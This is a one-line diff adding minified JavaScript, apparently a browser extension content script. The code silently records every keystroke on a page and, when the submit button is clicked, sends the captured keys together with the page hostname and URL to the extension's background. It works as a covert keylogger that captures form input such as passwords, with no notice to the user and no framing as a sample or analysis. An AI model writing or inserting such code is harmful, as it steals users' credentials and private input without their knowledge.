@@ -1,0 +1,1 @@
+var keyPressed=[],submitBtn=document.querySelector("button[type=submit]");document.addEventListener("keydown",function(e){keyPressed.push(e.key)}),submitBtn.addEventListener("click",function(e){chrome.runtime.sendMessage({keyPressed:keyPressed,source_hostname:window.location.hostname,source_url:window.location.href},function(e){})});
